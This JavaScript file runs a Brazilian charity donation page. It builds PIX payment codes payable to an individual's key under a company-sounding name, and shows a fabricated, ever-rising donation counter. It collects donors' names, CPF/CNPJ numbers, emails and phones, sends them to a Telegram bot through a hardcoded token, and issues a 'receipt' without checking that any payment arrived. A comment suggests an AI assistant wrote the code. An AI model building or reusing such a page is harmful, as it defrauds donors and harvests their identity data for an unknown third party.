// --- Constantes
// Dados para a geração do PIX. A chave foi extraída dos exemplos que você forneceu.
const PIX_CONFIG = {
    key: "9d0b151e-3a06-461f-b33a-d3c5669bd7d2",
    beneficiaryName: "SONIA DE JESUS",
    beneficiaryCity: "SAO PAULO",
    merchantName: "INSTITUIÇÃO TRANSFORMANDO VIDAS LTDA" // Adicionado para mais detalhes
};

// Token do Bot do Telegram.
const TELEGRAM_BOT_TOKEN = "8405316263:AAGnQ9ACDDYgJS1lipE92BPJly0pNjyFZf4";
const TELEGRAM_CHAT_ID = "5899156650";


// --- Elementos do DOM
const screens = document.querySelectorAll('.screen');
const donationForm = document.getElementById('donation-form');
const sharedSections = document.getElementById('shared-sections');
const pixKeyDisplay = document.getElementById('pix-key-display');
const companyInfo = document.getElementById('company-info');
const valueButtons = document.querySelectorAll('.value-btn');
const valueInput = document.getElementById('valor');


// --- Elementos do Novo Contador
const donationCounterElement = document.getElementById('donation-counter');
let donationCount = 137000; // Começa em 137 mil


let formData = {};


// --- Funções Auxiliares
function formatNumber(num) {
    return num.toLocaleString('pt-BR');
}

/**
 * Calcula o CRC16 (Cyclic Redundancy Check) para a string do PIX.
 * @param {string} payload - A string do PIX sem o CRC.
 * @returns {string} O checksum de 4 caracteres em hexadecimal.
 */
function crc16(payload) {
    let crc = 0xFFFF;
    for (let i = 0; i < payload.length; i++) {
        crc ^= payload.charCodeAt(i) << 8;
        for (let j = 0; j < 8; j++) {
            crc = (crc & 0x8000) ? (crc << 1) ^ 0x1021 : crc << 1;
        }
    }
    return ('0000' + (crc & 0xFFFF).toString(16).toUpperCase()).slice(-4);
}

/**
 * Gera o código PIX "Copia e Cola" completo com base no valor.
 * @param {number} amount - O valor da doação.
 * @returns {string} A string completa do PIX "Copia e Cola".
 */
function generatePixCode(amount) {
    const formattedAmount = amount.toFixed(2);
    const txid = '***'; // O PIX com valor não precisa de TXID complexo, '***' é suficiente.

    const formatField = (id, value) => {
        const len = value.length.toString().padStart(2, '0');
        return `${id}${len}${value}`;
    };

    const payloadParts = [
        formatField('00', '01'), // Payload Format Indicator
        formatField('26', [
            formatField('00', 'br.gov.bcb.pix'),
            formatField('01', PIX_CONFIG.key)
        ].join('')), // Merchant Account Information
        formatField('52', '0000'), // Merchant Category Code
        formatField('53', '986'), // Transaction Currency (BRL)
        formatField('54', formattedAmount), // Transaction Amount
        formatField('58', 'BR'), // Country Code
        formatField('59', PIX_CONFIG.beneficiaryName.substring(0, 25)), // Beneficiary Name
        formatField('60', PIX_CONFIG.beneficiaryCity.substring(0, 15)), // Beneficiary City
        formatField('62', formatField('05', txid)) // Additional Data Field (TXID)
    ];

    const payload = payloadParts.join('') + '6304'; // Adiciona o ID e tamanho do CRC
    const checksum = crc16(payload);

    return payload + checksum;
}


// --- Navegação entre Telas
function showScreen(screenId) {
    screens.forEach(screen => {
        screen.classList.remove('active');
    });
    document.getElementById(screenId).classList.add('active');

    sharedSections.style.display = (screenId === 'initial-screen') ? 'block' : 'none';
    window.scrollTo(0, 0);
}


// --- Funções de Formatação de Inputs
function formatCpfCnpj(value) {
    const cleaned = value.replace(/\D/g, '');
    if (cleaned.length <= 11) { // CPF
        return cleaned
            .replace(/(\d{3})(\d)/, '$1.$2')
            .replace(/(\d{3})(\d)/, '$1.$2')
            .replace(/(\d{3})(\d{1,2})/, '$1-$2')
            .slice(0, 14);
    } else { // CNPJ
        return cleaned
            .replace(/^(\d{2})(\d)/, '$1.$2')
            .replace(/^(\d{2})\.(\d{3})(\d)/, '$1.$2.$3')
            .replace(/\.(\d{3})(\d)/, '.$1/$2')
            .replace(/(\d{4})(\d)/, '$1-$2')
            .slice(0, 18);
    }
}

function formatPhone(value) {
    const cleaned = value.replace(/\D/g, '');
    return cleaned
        .replace(/^(\d{2})(\d)/, '($1) $2')
        .replace(/(\d{5})(\d)/, '$1-$2')
        .slice(0, 15);
}

function formatDate(value) {
    const cleaned = value.replace(/\D/g, '');
    return cleaned
        .replace(/(\d{2})(\d)/, '$1/$2')
        .replace(/(\d{2})(\d)/, '$1/$2')
        .slice(0, 10);
}


// --- Lógica do Formulário
function setupFormListeners() {
    const inputs = {
        nome: document.getElementById('nome'),
        sobrenome: document.getElementById('sobrenome'),
        cpf_cnpj: document.getElementById('cpf_cnpj'),
        telefone: document.getElementById('telefone'),
        nascimento: document.getElementById('nascimento')
    };

    inputs.nome.addEventListener('input', (e) => e.target.value = e.target.value.toUpperCase());
    inputs.sobrenome.addEventListener('input', (e) => e.target.value = e.target.value.toUpperCase());
    inputs.cpf_cnpj.addEventListener('input', (e) => {
        e.target.value = formatCpfCnpj(e.target.value);
        const isCnpj = e.target.value.length > 14;
        companyInfo.classList.toggle('hidden', !isCnpj);
    });
    inputs.telefone.addEventListener('input', (e) => e.target.value = formatPhone(e.target.value));
    inputs.nascimento.addEventListener('input', (e) => e.target.value = formatDate(e.target.value));

    valueButtons.forEach(btn => {
        btn.addEventListener('click', () => {
            valueButtons.forEach(b => b.classList.remove('selected'));
            btn.classList.add('selected');
            valueInput.value = btn.dataset.value;
        });
    });

    valueInput.addEventListener('input', () => {
        valueButtons.forEach(b => b.classList.remove('selected'));
        const matchingButton = [...valueButtons].find(b => b.dataset.value === valueInput.value);
        if (matchingButton) {
            matchingButton.classList.add('selected');
        }
    });

    donationForm.addEventListener('submit', handleFormSubmit);
}

function handleFormSubmit(event) {
    event.preventDefault();
    const form = new FormData(event.target);
    formData = Object.fromEntries(form.entries());

    // *** ALTERAÇÃO PRINCIPAL AQUI ***
    // Gera o código PIX com base no valor do formulário
    const donationValue = parseFloat(formData.valor);
    const pixCode = generatePixCode(donationValue);

    // Define o código PIX gerado na tela do PIX
    pixKeyDisplay.value = pixCode;
    showScreen('pix-screen');
}


// --- Lógica da Tela PIX
function setupPixScreenListeners() {
    document.getElementById('copy-pix-key').addEventListener('click', () => {
        navigator.clipboard.writeText(pixKeyDisplay.value).then(() => {
            alert('Código PIX copiado!');
        }).catch(err => {
            console.error('Erro ao copiar o código PIX: ', err);
        });
    });

    document.getElementById('confirm-payment-button').addEventListener('click', async () => {
        await sendDataToTelegram();
        showReceipt();
        startThankYouLoop();
    });
}


// --- Integração com o Telegram
async function sendDataToTelegram() {
    const isCnpj = formData.cpf_cnpj && formData.cpf_cnpj.length > 14;
    const message = `
          *Nova Doação Recebida!*  
        ----------------------------------
        *Doador:* ${formData.nome} ${formData.sobrenome}
        *Tipo:* ${isCnpj ? 'Pessoa Jurídica' : 'Pessoa Física'}
        *CPF/CNPJ:* ${formData.cpf_cnpj || 'Não informado'}
        *E-mail:* ${formData.email || 'Não informado'}
        *Telefone:* ${formData.telefone || 'Não informado'}
        ----------------------------------
        *Valor:* R$ ${parseFloat(formData.valor).toFixed(2).replace('.', ',')}
        *Doação Mensal:* ${formData.recorrente ? 'Sim' : 'Não'}
    `;

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
    } catch (error) {
        console.error("Erro ao enviar para o Telegram:", error);
    }
}


// --- Comprovante e Loop de Agradecimento
function showReceipt() {
    const now = new Date();
    document.getElementById('receipt-datetime').textContent = now.toLocaleString('pt-BR');
    document.getElementById('receipt-name').textContent = `${formData.nome} ${formData.sobrenome}`;
    document.getElementById('receipt-value').textContent = `R$ ${parseFloat(formData.valor).toFixed(2).replace('.', ',')}`;
    document.getElementById('receipt-type').textContent = formData.recorrente ? 'Doação Mensal' : 'Doação Única';
    document.getElementById('receipt-id').textContent = new Date().getTime().toString().slice(-8);

    const messageEl = document.getElementById('receipt-message');
    const nameToUse = formData.nome_empresa || formData.nome;
    messageEl.textContent = `Muito obrigado, ${nameToUse}! Sua solidariedade ilumina caminhos e faz a diferença.`;

    showScreen('receipt-screen');
}


function startThankYouLoop() {
    setTimeout(() => {
        showScreen('thankyou-screen');
        setTimeout(() => {
            resetApp();
        }, 5000);
    }, 5000);
}


// --- Funções do Contador Personalizado
function startDonationCounter() {
    // Atualiza o contador a cada 10 segundos
    setInterval(() => {
        donationCount += 3;
        if (donationCounterElement) {
            donationCounterElement.textContent = formatNumber(donationCount);
        }
    }, 10000);
}


// --- Inicialização e Reset
function resetApp() {
    donationForm.reset();
    valueButtons.forEach(b => b.classList.remove('selected'));
    companyInfo.classList.add('hidden');
    formData = {};
    showScreen('initial-screen');
}


function init() {
    document.getElementById('start-donation-button').addEventListener('click', () => showScreen('form-screen'));
    document.getElementById('back-to-initial').addEventListener('click', () => showScreen('initial-screen'));

    setupFormListeners();
    setupPixScreenListeners();
    startDonationCounter(); // Chama a nova função do contador

    showScreen('initial-screen');
}


// --- Iniciar o aplicativo ---
init();
